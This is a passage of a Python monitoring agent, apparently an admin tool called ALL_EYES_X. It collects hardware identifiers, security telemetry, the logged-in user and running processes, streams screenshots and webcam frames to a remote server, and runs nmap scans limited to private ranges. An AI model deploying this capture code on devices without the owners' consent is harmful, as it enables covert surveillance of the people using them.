                                'vram_gb': vram_gb,
                                'driver': parts[2] if len(parts) > 2 else '',
                                'manufacturer': 'NVIDIA',
                            })
            except:
                pass
    
    elif sys.platform == 'darwin':
        try:
            output = subprocess.check_output(
                ['system_profiler', 'SPDisplaysDataType'], timeout=10
            ).decode('utf-8', errors='ignore')
            chipset = re.search(r'Chipset Model:\s*(.+)', output)
            vram = re.search(r'VRAM \(Total\):\s*(.+)', output)
            vendor = re.search(r'Vendor:\s*(.+)', output)
            gpus.append({
                'name': chipset.group(1).strip()[:120] if chipset else 'Unknown',
                'vram_gb': 0,
                'driver': '',
                'manufacturer': vendor.group(1).strip() if vendor else 'Apple',
            })
        except:
            pass
    
    return gpus


def collect_storage_info():
    """Get storage device details: drives, capacity, free space, type."""
    storage = []
    
    if sys.platform == 'win32':
        try:
            # Get logical drives
            output = subprocess.check_output(
                'wmic logicaldisk get deviceid,size,freespace,drivetype,volumename /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            
            drive_map = {}
            lines = [l.strip() for l in output.split('\n') if l.strip()]
            for line in lines:
                if 'DeviceID' in line or line.upper().startswith('NODE'):
                    continue
                parts = line.split(',')
                if len(parts) >= 2:
                    device = parts[1].strip()
                    try:
                        total_bytes = int(parts[2]) if len(parts) > 2 and parts[2].strip() else 0
                    except:
                        total_bytes = 0
                    try:
                        free_bytes = int(parts[3]) if len(parts) > 3 and parts[3].strip() else 0
                    except:
                        free_bytes = 0
                    try:
                        drive_type = int(parts[4]) if len(parts) > 4 else 0
                    except:
                        drive_type = 0
                    vol_name = parts[5].strip().strip('"') if len(parts) > 5 else ''
                    
                    type_names = {0: 'Unknown', 1: 'No Root', 2: 'Removable', 3: 'Local Disk', 4: 'Network', 5: 'CD-ROM'}
                    
                    if total_bytes > 0:
                        used_bytes = total_bytes - free_bytes
                        drive_map[device] = {
                            'device': device,
                            'label': vol_name or device,
                            'total_gb': round(total_bytes / (1024**3), 1),
                            'used_gb': round(used_bytes / (1024**3), 1),
                            'free_gb': round(free_bytes / (1024**3), 1),
                            'used_percent': round((used_bytes / total_bytes) * 100, 1) if total_bytes > 0 else 0,
                            'drive_type': type_names.get(drive_type, 'Unknown'),
                        }
            
            # Get physical disk models
            try:
                output2 = subprocess.check_output(
                    'wmic diskdrive get model,size,interfacetype,mediatype /format:csv',
                    shell=True, timeout=10, stderr=subprocess.DEVNULL
                ).decode('utf-8', errors='ignore')
                
                lines2 = [l.strip() for l in output2.split('\n') if l.strip()]
                for line in lines2:
                    if 'Model' in line or line.upper().startswith('NODE'):
                        continue
                    parts = line.split(',')
                    if len(parts) >= 2:
                        model = parts[1].strip()
                        # Try to match to a drive
                        for device, drive_info in drive_map.items():
                            if 'model' not in drive_info:
                                drive_info['model'] = model[:120]
                                try:
                                    phys_bytes = int(parts[2]) if len(parts) > 2 and parts[2].strip() else 0
                                    if phys_bytes > 0 and drive_info['total_gb'] == 0:
                                        drive_info['total_gb'] = round(phys_bytes / (1024**3), 1)
                                except:
                                    pass
                                drive_info['interface'] = parts[3].strip() if len(parts) > 3 else ''
                                drive_info['media_type'] = parts[4].strip() if len(parts) > 4 else ''
                                break
            except:
                pass
            
            for device, drive_info in drive_map.items():
                storage.append(drive_info)
                
        except Exception as e:
            print(f"[-] Storage collection error: {e}")
    
    elif sys.platform == 'linux':
        try:
            output = subprocess.check_output(['df', '-B1', '--exclude-type=tmpfs', '--exclude-type=devtmpfs'], timeout=5).decode()
            for line in output.split('\n')[1:]:
                if not line.strip():
                    continue
                parts = line.split()
                if len(parts) >= 6:
                    device = parts[0]
                    total = int(parts[1])
                    used = int(parts[2])
                    free = int(parts[3])
                    mount = parts[5]
                    if total > 0:
                        storage.append({
                            'device': device,
                            'label': mount,
                            'total_gb': round(total / (1024**3), 1),
                            'used_gb': round(used / (1024**3), 1),
                            'free_gb': round(free / (1024**3), 1),
                            'used_percent': round((used / total) * 100, 1),
                            'drive_type': 'Local Disk',
                            'model': '',
                            'interface': '',
                        })
        except:
            pass
    
    elif sys.platform == 'darwin':
        try:
            output = subprocess.check_output(['df', '-g'], timeout=5).decode()
            for line in output.split('\n')[1:]:
                if not line.strip():
                    continue
                parts = line.split()
                if len(parts) >= 6:
                    total = int(parts[1])
                    used = int(parts[2])
                    free = int(parts[3])
                    mount = parts[5]
                    if total > 0:
                        storage.append({
                            'device': parts[0],
                            'label': mount,
                            'total_gb': total,
                            'used_gb': used,
                            'free_gb': free,
                            'used_percent': round((used / total) * 100, 1) if total > 0 else 0,
                            'drive_type': 'Local Disk',
                            'model': '',
                            'interface': '',
                        })
        except:
            pass
    
    return storage


def collect_network_info():
    """Get network interface details: IP, MAC, speed, type."""
    interfaces = []
    
    # First try psutil for most complete data
    try:
        import psutil
        import socket as sock_module
        
        net_io = psutil.net_io_counters(pernic=True)
        net_addrs = psutil.net_if_addrs()
        net_stats = psutil.net_if_stats()
        
        for name, addrs in net_addrs.items():
            if name == 'lo' or name.startswith('Loopback'):
                continue
            
            info = {
                'name': name,
                'ip': '',
                'mac': '',
                'speed_mbps': 0,
                'is_up': False,
                'bytes_sent': 0,
                'bytes_recv': 0,
                'interface_type': 'Unknown',
            }
            
            for addr in addrs:
                if addr.family == sock_module.AF_INET and not info['ip']:
                    info['ip'] = addr.address
                elif addr.family == sock_module.AF_INET6 and not info.get('ipv6'):
                    info['ipv6'] = addr.address
                elif hasattr(sock_module, 'AF_PACKET') and addr.family == sock_module.AF_PACKET:
                    info['mac'] = addr.address
                elif hasattr(addr, 'family') and not hasattr(sock_module, 'AF_PACKET'):
                    # Windows: AF_LINK or similar
                    if ':' in addr.address and not info['mac']:
                        info['mac'] = addr.address
            
            if name in net_stats:
                stats = net_stats[name]
                info['is_up'] = stats.isup
                if stats.speed > 0:
                    info['speed_mbps'] = stats.speed
            
            if name in net_io:
                io = net_io[name]
                info['bytes_sent'] = io.bytes_sent
                info['bytes_recv'] = io.bytes_recv
            
            # Determine interface type
            name_lower = name.lower()
            if any(k in name_lower for k in ['wi-fi', 'wlan', 'wireless', '802.11']):
                info['interface_type'] = 'Wi-Fi'
            elif 'eth' in name_lower or 'enp' in name_lower or 'enx' in name_lower:
                info['interface_type'] = 'Ethernet'
            elif 'vmware' in name_lower or 'vnet' in name_lower or 'docker' in name_lower:
                info['interface_type'] = 'Virtual'
            elif 'bluetooth' in name_lower:
                info['interface_type'] = 'Bluetooth'
            elif 'usb' in name_lower:
                info['interface_type'] = 'USB'
            else:
                info['interface_type'] = 'Ethernet'
            
            if info['ip'] or info['mac']:
                interfaces.append(info)
    except:
        pass
    
    # Fallback: wmic for Windows
    if not interfaces and sys.platform == 'win32':
        try:
            output = subprocess.check_output(
                'wmic nic where "NetEnabled=TRUE" get Name,MACAddress,Speed,Description /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            
            lines = [l.strip() for l in output.split('\n') if l.strip()]
            for line in lines:
                if 'Name' in line or line.upper().startswith('NODE'):
                    continue
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 4:
                    name = parts[1] if parts[1] else parts[3]
                    speed = 0
                    try:
                        speed = int(parts[2]) // 1000000 if parts[2] else 0
                    except:
                        pass
                    interfaces.append({
                        'name': name[:80] if len(parts) > 3 else parts[3][:80],
                        'ip': get_local_ip(),
                        'mac': parts[2] if ':' in parts[2] else '',
                        'speed_mbps': speed,
                        'is_up': True,
                        'bytes_sent': 0,
                        'bytes_recv': 0,
                        'interface_type': 'Ethernet',
                    })
        except:
            pass
    
    # Ultimate fallback: at least show our own IP
    if not interfaces:
        interfaces.append({
            'name': 'Unknown',
            'ip': get_local_ip(),
            'mac': get_mac_address(),
            'speed_mbps': 0,
            'is_up': True,
            'bytes_sent': 0,
            'bytes_recv': 0,
            'interface_type': 'Unknown',
        })
    
    return interfaces


def collect_hardware_info():
    """Get BIOS, motherboard, serial numbers, and other hardware identifiers."""
    info = {
        'bios': {},
        'motherboard': {},
        'system': {},
    }
    
    if sys.platform == 'win32':
        try:
            # BIOS info
            output = subprocess.check_output(
                'wmic bios get manufacturer,name,serialnumber,smbiosbiosversion /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            for line in output.split('\n'):
                parts = line.strip().split(',')
                if len(parts) >= 4 and 'Manufacturer' not in line:
                    info['bios'] = {
                        'manufacturer': parts[1].strip(),
                        'name': parts[2].strip(),
                        'serial': parts[3].strip(),
                        'version': parts[4].strip() if len(parts) > 4 else '',
                    }
                    break
        except:
            pass
        
        try:
            # Motherboard info
            output = subprocess.check_output(
                'wmic baseboard get manufacturer,product,serialnumber,version /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            for line in output.split('\n'):
                parts = line.strip().split(',')
                if len(parts) >= 3 and 'Manufacturer' not in line:
                    info['motherboard'] = {
                        'manufacturer': parts[1].strip(),
                        'product': parts[2].strip(),
                        'serial': parts[3].strip() if len(parts) > 3 else '',
                        'version': parts[4].strip() if len(parts) > 4 else '',
                    }
                    break
        except:
            pass
        
        try:
            # System info
            output = subprocess.check_output(
                'wmic computersystem get manufacturer,model,systemtype,totalphysicalmemory /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            for line in output.split('\n'):
                parts = line.strip().split(',')
                if len(parts) >= 2 and 'Manufacturer' not in line:
                    info['system'] = {
                        'manufacturer': parts[1].strip(),
                        'model': parts[2].strip() if len(parts) > 2 else '',
                        'system_type': parts[3].strip() if len(parts) > 3 else '',
                    }
                    break
        except:
            pass
        
        # OS detailed info
        try:
            output = subprocess.check_output(
                'wmic os get caption,version,osarchitecture,buildnumber /format:csv',
                shell=True, timeout=10, stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            for line in output.split('\n'):
                parts = line.strip().split(',')
                if len(parts) >= 3 and 'Caption' not in line:
                    info['os'] = {
                        'caption': parts[1].strip(),
                        'version': parts[2].strip(),
                        'architecture': parts[3].strip() if len(parts) > 3 else '',
                        'build': parts[4].strip() if len(parts) > 4 else '',
                    }
                    break
        except:
            pass
    
    elif sys.platform == 'linux':
        try:
            # /sys/class/dmi for BIOS/board info on modern Linux
            paths = {
                'bios': {'vendor': '/sys/class/dmi/id/bios_vendor', 'version': '/sys/class/dmi/id/bios_version', 'date': '/sys/class/dmi/id/bios_date'},
                'motherboard': {'vendor': '/sys/class/dmi/id/board_vendor', 'name': '/sys/class/dmi/id/board_name', 'serial': '/sys/class/dmi/id/board_serial'},
                'system': {'vendor': '/sys/class/dmi/id/product_vendor', 'name': '/sys/class/dmi/id/product_name', 'serial': '/sys/class/dmi/id/product_serial'},
            }
            for section, items in paths.items():
                for key, path in items.items():
                    try:
                        with open(path) as f:
                            val = f.read().strip()
                            if val and 'to be filled' not in val.lower():
                                info.setdefault(section, {})[key] = val
                    except:
                        pass
        except:
            pass
        
        try:
            # OS info
            os_release = {}
            with open('/etc/os-release') as f:
                for line in f:
                    if '=' in line:
                        k, v = line.strip().split('=', 1)
                        os_release[k] = v.strip('"')
            info['os'] = {
                'caption': f"{os_release.get('NAME', '')} {os_release.get('VERSION_ID', '')}",
                'version': platform.release(),
                'architecture': platform.machine(),
            }
        except:
            info['os'] = {
                'caption': f"Linux {platform.release()}",
                'version': platform.release(),
                'architecture': platform.machine(),
            }
    
    elif sys.platform == 'darwin':
        try:
            output = subprocess.check_output(['system_profiler', 'SPHardwareDataType'], timeout=10).decode()
            serial = re.search(r'Serial Number \(system\):\s*(.+)', output)
            model = re.search(r'Model Identifier:\s*(.+)', output)
            info['system'] = {
                'serial': serial.group(1).strip() if serial else '',
                'model': model.group(1).strip() if model else '',
            }
            info['os'] = {
                'caption': f"macOS {platform.release()}",
                'version': platform.release(),
                'architecture': platform.machine(),
            }
        except:
            pass
    
    return info

# ============================================================
# SECURITY TELEMETRY (v3.4) — firewall, AV, ports, usage, net
# ============================================================
_last_security_report = 0.0
_security_telemetry = {}

def get_firewall_status():
    try:
        if sys.platform == 'win32':
            out = subprocess.check_output('netsh advfirewall show allprofiles state', shell=True, timeout=10).decode(errors='ignore')
            return sum(1 for line in out.splitlines() if 'State' in line and ' ON' in line.upper()) > 0
        elif sys.platform == 'linux':
            try:
                out = subprocess.check_output(['ufw', 'status'], timeout=5, stderr=subprocess.DEVNULL).decode(errors='ignore')
                return 'active' in out.lower()
            except Exception:
                out = subprocess.check_output(['systemctl', 'is-active', 'firewalld'], timeout=5, stderr=subprocess.DEVNULL).decode(errors='ignore')
                return out.strip() == 'active'
        elif sys.platform == 'darwin':
            out = subprocess.check_output(['/usr/libexec/ApplicationFirewall/socketfilterfw', '--getglobalstate'], timeout=5).decode(errors='ignore')
            return 'enabled' in out.lower()
    except Exception:
        return None
    return None

def get_antivirus_status():
    try:
        if sys.platform == 'win32':
            out = subprocess.check_output(
                'powershell -NoProfile -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName"',
                shell=True, timeout=15).decode(errors='ignore').strip()
            return bool(out)
        elif sys.platform == 'linux':
            for svc in ['clamav-daemon', 'clamd', 'sophos']:
                try:
                    out = subprocess.check_output(['systemctl', 'is-active', svc], timeout=5, stderr=subprocess.DEVNULL).decode(errors='ignore').strip()
                    if out == 'active':
                        return True
                except Exception:
                    pass
    except Exception:
        return None
    return None

def get_open_ports():
    ports = set()
    try:
        if sys.platform == 'win32':
            out = subprocess.check_output('netstat -an', shell=True, timeout=10).decode(errors='ignore')
            pattern = re.compile(r'TCP\s+\S+:(\d+)\s+\S+:0\s+LISTENING')
        else:
            out = subprocess.check_output(['netstat', '-tln'], timeout=5).decode(errors='ignore')
            pattern = re.compile(r'^\S+\s+\S+\s+\S+\s+\S+:(\d+)\s+\S+\s+LISTEN', re.M)
        for m in pattern.finditer(out):
            port = int(m.group(1))
            if 1 <= port <= 65535:
                ports.add(port)
    except Exception:
        pass
    return sorted(ports)[:30]

def check_disk_encryption():
    try:
        if sys.platform == 'win32':
            out = subprocess.check_output(
                'powershell -NoProfile -Command "(Get-BitLockerVolume -MountPoint $env:SystemDrive -ErrorAction SilentlyContinue).ProtectionStatus"',
                shell=True, timeout=15).decode(errors='ignore').strip()
            return out == 'On'
        elif sys.platform == 'darwin':
            out = subprocess.check_output(['fdesetup', 'status'], timeout=5).decode(errors='ignore').strip()
            return 'On' in out
        elif sys.platform == 'linux':
            out = subprocess.check_output(['lsblk', '-o', 'TYPE'], timeout=5).decode(errors='ignore')
            return 'crypto' in out.lower() or 'LUKS' in out
    except Exception:
        return None
    return None

def get_wifi_info():
    try:
        if sys.platform == 'win32':
            out = subprocess.check_output('netsh wlan show interfaces', shell=True, timeout=10).decode(errors='ignore')
            ssid = ''
            signal = ''
            for line in out.splitlines():
                if 'SSID' in line and 'BSSID' not in line:
                    ssid = line.split(':', 1)[1].strip()
                elif 'Signal' in line:
                    signal = line.split(':', 1)[1].strip()
            return {'ssid': ssid, 'signal': signal} if ssid else None
        elif sys.platform == 'linux':
            out = subprocess.check_output(['nmcli', '-t', '-f', 'active,ssid,signal', 'dev', 'wifi'], timeout=5, stderr=subprocess.DEVNULL).decode(errors='ignore')
            for line in out.splitlines():
                parts = line.split(':')
                if len(parts) >= 3 and parts[0] == 'yes':
                    return {'ssid': parts[1], 'signal': parts[2] + '%'}
        elif sys.platform == 'darwin':
            out = subprocess.check_output(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-I'], timeout=5, stderr=subprocess.DEVNULL).decode(errors='ignore')
            ssid = ''
            for line in out.splitlines():
                if line.strip().startswith('SSID:'):
                    ssid = line.split(':', 1)[1].strip()
            return {'ssid': ssid, 'signal': ''} if ssid else None
    except Exception:
        return None
    return None

def get_battery_info():
    try:
        import psutil
        if hasattr(psutil, 'sensors_battery'):
            bat = psutil.sensors_battery()
            if bat:
                return {'percent': int(bat.percent), 'plugged': bool(bat.power_plugged)}
    except Exception:
        pass
    try:
        if sys.platform == 'linux':
            with open('/sys/class/power_supply/BAT0/capacity') as f:
                return {'percent': int(f.read().strip()), 'plugged': None}
    except Exception:
        pass
    return None

def get_logged_user():
    try:
        import getpass
        return getpass.getuser()
    except Exception:
        return None

def get_boot_time():
    try:
        import psutil
        return datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat()
    except Exception:
        return None

def get_gpu_summary():
    try:
        gpus = collect_gpu_info()
        if gpus:
            return gpus[0].get('name', 'Unknown')[:80]
    except Exception:
        pass
    return None

def get_running_processes():
    try:
        import psutil
        procs = []
        for p in psutil.process_iter(['name', 'username']):
            try:
                procs.append({'name': p.info['name'], 'user': p.info['username']})
            except Exception:
                pass
        return sorted(procs, key=lambda x: x['name'] or '')[:20]
    except Exception:
        return []

def get_usb_devices():
    try:
        import psutil
        usb = []
        for part in psutil.disk_partitions(all=True):
            if part.opts and 'removable' in part.opts.lower():
                usb.append(part.device)
        return usb
    except Exception:
        return []

def get_network_speed():
    try:
        import psutil
        n1 = psutil.net_io_counters()
        time.sleep(1)
        n2 = psutil.net_io_counters()
        return {
            'download_bps': (n2.bytes_recv - n1.bytes_recv),
            'upload_bps': (n2.bytes_sent - n1.bytes_sent),
        }
    except Exception:
        return None

def collect_security_telemetry():
    """Full security telemetry bundle for enriched heartbeats."""
    global _last_security_report, _security_telemetry
    now = time.time()
    if _security_telemetry and now - _last_security_report < SECURITY_TELEMETRY_INTERVAL:
        return _security_telemetry

    telemetry = {
        'firewall': get_firewall_status(),
        'antivirus': get_antivirus_status(),
        'open_ports': get_open_ports(),
        'encrypted_disk': check_disk_encryption(),
        'wifi': get_wifi_info(),
        'battery': get_battery_info(),
        'logged_user': get_logged_user(),
        'boot_time': get_boot_time(),
        'gpu': get_gpu_summary(),
        'processes': get_running_processes(),
        'usb_devices': get_usb_devices(),
        'net_speed': get_network_speed(),
        'malware_detected': False,
        'suspicious_processes': [],
        'critical_cves': [],
    }
    try:
        import psutil
        telemetry['cpu'] = round(psutil.cpu_percent(interval=0.2), 1)
        telemetry['ram'] = round(psutil.virtual_memory().percent, 1)
        telemetry['disk'] = round(psutil.disk_usage('/').percent, 1)
        net = psutil.net_io_counters()
        telemetry['net_sent'] = net.bytes_sent
        telemetry['net_recv'] = net.bytes_recv
    except Exception:
        pass

    _security_telemetry = telemetry
    _last_security_report = now
    return telemetry

# ============================================================
# API COMMUNICATION
# ============================================================
# Persistent connection handling.
#
# Opening a brand-new TCP socket for every poll (touch / screenshot / webcam)
# makes Windows abort half-finished sockets and floods the server console with
# "ConnectionAbortedError: [WinError 10053]". Reusing one keep-alive connection
# removes almost all of that churn.
import http.client
from urllib.parse import urlparse

# ---------------------------------------------------------------------------
# TWO SEPARATE HTTP CHANNELS
#
# Heartbeats and video frames used to share ONE keep-alive socket. A frame is a
# large POST; with a 10s timeout and one retry, a single stalled screenshot
# upload could block that socket for ~20s. Two in a row put more than 30s
# between heartbeats, the server's offline threshold, so a device on a slow or
# congested link (Tailscale, Wi-Fi) would flap offline - it appeared in the
# system and then disappeared.
#
# Splitting them means a frame upload can never delay a heartbeat:
#   control - heartbeat / register / command results. Small, must get through,
#             so it keeps the 10s timeout and one retry.
#   bulk    - screenshot / webcam frames. Large and disposable, so it gets a
#             short timeout and NO retry: dropping a frame is free, and the next
#             one arrives 20ms later.
# ---------------------------------------------------------------------------
CHANNEL_TIMEOUTS = {'control': 10.0, 'bulk': 4.0}
CHANNEL_RETRIES = {'control': 2, 'bulk': 1}

_conns = {'control': None, 'bulk': None}
_conn_targets = {'control': None, 'bulk': None}


def _close_conn(channel='control'):
    if _conns.get(channel) is not None:
        try:
            _conns[channel].close()
        except Exception:
            pass
    _conns[channel] = None
    _conn_targets[channel] = None


def _close_all_conns():
    for channel in list(_conns):
        _close_conn(channel)


def _ensure_conn(parsed, channel='control'):
    """Return the keep-alive connection for one channel, bound to SERVER_URL.

    SERVER_URL may be reassigned from argv/env after import, so the target is
    re-checked on every call instead of being cached once at import time.
    """
    target = (parsed.scheme, parsed.hostname or '127.0.0.1', parsed.port)
    if _conns.get(channel) is not None and _conn_targets.get(channel) == target:
        return _conns[channel]
    _close_conn(channel)
    host = parsed.hostname or '127.0.0.1'
    timeout = CHANNEL_TIMEOUTS.get(channel, 10.0)
    if parsed.scheme == 'https':
        _conns[channel] = http.client.HTTPSConnection(
            host, parsed.port or 443, timeout=timeout, context=create_ssl_context()
        )
    else:
        _conns[channel] = http.client.HTTPConnection(
            host, parsed.port or 80, timeout=timeout
        )
    _conn_targets[channel] = target
    return _conns[channel]


def _http_json(endpoint, data=None, method='POST', channel='control'):
    """Perform one JSON request over the given channel's persistent connection.

    Retries with a fresh socket if the pooled connection was dropped. Control
    traffic retries once; bulk frames do not, because a stale frame is worthless
    by the time a retry would land.
    """
    parsed = urlparse(SERVER_URL)
    path = (parsed.path or '') + endpoint
    body = None
    headers = {
        'User-Agent': 'ALL_EYES_X-Client/3.5',
        'Connection': 'keep-alive',
    }
    if data is not None:
        body = json.dumps(data).encode('utf-8')
        headers['Content-Type'] = 'application/json'

    last_error = None
    for _attempt in range(CHANNEL_RETRIES.get(channel, 2)):
        conn = _ensure_conn(parsed, channel)
        try:
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            raw = resp.read()
            status = resp.status
            if not raw:
                return {'error': f'HTTP {status}', 'status': status}
            try:
                return json.loads(raw.decode('utf-8', 'replace'))
            except json.JSONDecodeError:
                return {'error': 'Invalid JSON response', 'status': status}
        except (http.client.HTTPException, ConnectionError, OSError, TimeoutError) as e:
            last_error = e
            _close_conn(channel)
            continue
    return {'error': f'Connection failed: {last_error}'}


def api_request(endpoint, data=None, method='POST'):
    """Control traffic: heartbeat, register, command results."""
    return _http_json(endpoint, data=data, method=method, channel='control')


def api_request_raw(endpoint, data, method='POST'):
    """Bulk traffic: screenshot and webcam frames. Never blocks the heartbeat."""
    result = _http_json(endpoint, data=data, method=method, channel='bulk')
    if isinstance(result, dict) and 'Connection failed' in str(result.get('error', '')):
        return {'error': 'send_failed'}
    return result


# ============================================================
# SCREENSHOT CAPTURE
# ============================================================
_prev_frame_array = None
_frame_width = 0
_frame_height = 0
_last_full_send = 0.0

_mss_instance = None
_screenshot_error_notice = 0.0


def _get_mss():
    """One reusable mss instance for the life of the process.

    A fresh mss.mss() was being created on every capture - 50 times a second.
    That opens and closes a display/GDI context each time, and on current mss it
    also prints a DeprecationWarning per call, which buried every real line of
    agent output (logs/client.err.log filled with nothing but that warning).
    """
    global _mss_instance
    if _mss_instance is None:
        import mss
        factory = getattr(mss, 'MSS', None) or mss.mss
        _mss_instance = factory()
    return _mss_instance


def _report_screenshot_error(stage, exc):
    """Print capture failures at most once a minute.

    Every failure path in capture used to be a bare `except: pass`, so a broken
    capture stack produced a stream of nothing and no explanation at all.
    """
    global _screenshot_error_notice
    now = time.time()
    if now - _screenshot_error_notice < 60:
        return
    _screenshot_error_notice = now
    print(f"[-] Screenshot capture failed at {stage}: {type(exc).__name__}: {exc}")


def capture_screenshot():
    global _prev_frame_array, _frame_width, _frame_height, _last_full_send
    if not capability_profile().get('screenshot'):
        return None
    
    try:
        import mss
        import mss.tools
        from PIL import Image
        import numpy as np
        
        # nullcontext keeps the original block shape while reusing one instance.
        with contextlib.nullcontext(_get_mss()) as sct:
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            
            img_array = np.frombuffer(sct_img.rgb, dtype=np.uint8).reshape(
                sct_img.height, sct_img.width, 3
            )
            
            current_h, current_w = img_array.shape[:2]
            
            if current_w > 1920:
                scale = 1920 / current_w
                new_w = int(current_w * scale)
                new_h = int(current_h * scale)
                pil_img = Image.frombuffer('RGB', (current_w, current_h), img_array.tobytes())
                pil_img = pil_img.resize((new_w, new_h), Image.LANCZOS)
                img_array = np.array(pil_img)
                current_h, current_w = new_h, new_w
            
            send_full = True
            dirty_x, dirty_y, dirty_w, dirty_h = 0, 0, current_w, current_h
            
            if _prev_frame_array is not None and _prev_frame_array.shape == img_array.shape:
                diff = np.abs(img_array.astype(np.int16) - _prev_frame_array.astype(np.int16))
                diff_mask = np.any(diff > 20, axis=2)
                
                changed_pixels = np.sum(diff_mask)
                total_pixels = current_h * current_w
                change_ratio = changed_pixels / total_pixels if total_pixels > 0 else 1.0
                
                if change_ratio > 0.001:
                    rows = np.any(diff_mask, axis=1)
                    cols = np.any(diff_mask, axis=0)
                    
                    if rows.any() and cols.any():
                        y_min, y_max = np.where(rows)[0][[0, -1]]
                        x_min, x_max = np.where(cols)[0][[0, -1]]
                        
                        pad = 30
                        y_min = max(0, y_min - pad)
                        y_max = min(current_h, y_max + pad)
                        x_min = max(0, x_min - pad)
                        x_max = min(current_w, x_max + pad)
                        
                        dirty_h = y_max - y_min
                        dirty_w = x_max - x_min
                        dirty_area = dirty_h * dirty_w
                        total_area = current_h * current_w
                        
                        if dirty_area / total_area < MAX_DIRTY_PERCENT:
                            send_full = False
                            dirty_x, dirty_y = x_min, y_min
                            crop = img_array[y_min:y_max, x_min:x_max]
                            img_to_encode = Image.frombuffer('RGB', (dirty_w, dirty_h), crop.tobytes())
                        else:
                            img_to_encode = Image.frombuffer('RGB', (current_w, current_h), img_array.tobytes())
                    else:
                        img_to_encode = Image.frombuffer('RGB', (current_w, current_h), img_array.tobytes())
                else:
                    # Screen is static. Going completely silent made the Live
                    # Monitor read 3-4 FPS even though the pipe was healthy, and
                    # a device switch looked frozen. Send a keep-alive full frame
                    # every FULL_FRAME_KEEPALIVE seconds instead.
                    if time.time() - _last_full_send < FULL_FRAME_KEEPALIVE:
                        return None
                    img_to_encode = Image.frombuffer('RGB', (current_w, current_h), img_array.tobytes())
            else:
                img_to_encode = Image.frombuffer('RGB', (current_w, current_h), img_array.tobytes())
            
            _prev_frame_array = img_array.copy()
            _frame_width, _frame_height = current_w, current_h
            if send_full:
                _last_full_send = time.time()
            
            buffer = io.BytesIO()
            img_to_encode.save(buffer, format='JPEG', quality=SCREENSHOT_QUALITY, optimize=True)
            img_b64 = base64.b64encode(buffer.getvalue()).decode()
            
            return {
                'full_frame': send_full,
                'image': img_b64,
                'x': dirty_x,
                'y': dirty_y,
                'width': dirty_w if not send_full else current_w,
                'height': dirty_h if not send_full else current_h,
                'screen_width': current_w,
                'screen_height': current_h,
            }
    except Exception as exc:
        # numpy or mss unavailable/broken. Falls through to the ImageGrab
        # fallback below, which sends whole frames - the stream survives but
        # loses dirty-rect compression, so say so instead of staying silent.
        _report_screenshot_error('mss/numpy path', exc)

    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        w, h = img.size
        buffer = io.BytesIO()
        img.save(buffer, format='JPEG', quality=SCREENSHOT_QUALITY)
        img_b64 = base64.b64encode(buffer.getvalue()).decode()
        return {
            'full_frame': True,
            'image': img_b64,
            'x': 0, 'y': 0,
            'width': w, 'height': h,
            'screen_width': w, 'screen_height': h,
        }
    except Exception as exc:
        _report_screenshot_error('ImageGrab fallback', exc)
    
    if sys.platform == 'win32':
        return capture_subprocess_windows_full()
    
    return None


def capture_subprocess_windows_full():
    ps_script = """
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $ms = New-Object System.IO.MemoryStream
    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    [System.Console]::Out.Write([System.Convert]::ToBase64String($ms.ToArray()))
    $graphics.Dispose()
    $bitmap.Dispose()
    """
    try:
        result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_script], 
                               capture_output=True, timeout=20)
        if result.stdout:
            img_b64 = result.stdout.decode().strip()
            return {
                'full_frame': True,
                'image': img_b64,
                'x': 0, 'y': 0,
                'width': 1920, 'height': 1080,
                'screen_width': 1920, 'screen_height': 1080,
            }
    except:
        pass
    return None


# ============================================================
# WEBCAM CAPTURE
# ============================================================
def capture_webcam(camera='front'):
    """Grab one frame. `camera` selects front/back where the device exposes
    more than one index; anything unavailable falls back to index 0."""
    if not capability_profile().get('webcam'):
        return None
    try:
        import cv2
    except ImportError:
        return None

    # Try the requested index first, then 0, then 1.
    requested = 1 if str(camera).lower() == 'back' else 0
    for index in (requested, 0, 1):
        cap = None
        try:
            cap = cv2.VideoCapture(index)
            if not cap.isOpened():
                continue
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, WEBCAM_QUALITY])
                return base64.b64encode(buffer.tobytes()).decode()
        except Exception:
            continue
        finally:
            if cap is not None:
                try:
                    cap.release()
                except Exception:
                    pass
    return None


# ============================================================
# NMAP SECURITY SCANS
# ============================================================
TAILSCALE_NET = ipaddress.ip_network('100.64.0.0/10')


def validate_scan_target(target):
    try:
        net = ipaddress.ip_network((target or '').strip(), strict=False)
    except Exception:
        raise ValueError('Invalid scan target. Use an IP address or CIDR range.')
    if net.num_addresses > 4096:
        raise PermissionError('Scan range too large. Maximum allowed range is 4096 addresses.')
    if not (net.is_private or net.subnet_of(TAILSCALE_NET)):
        raise PermissionError('Client refuses to scan non-private/non-Tailscale targets.')
    return str(net)


def parse_nmap_xml(xml_text):
    parsed = {'hosts': [], 'open_ports': []}
    try:
        root = ET.fromstring(xml_text)
        for host in root.findall('host'):
            addr_node = host.find('address')
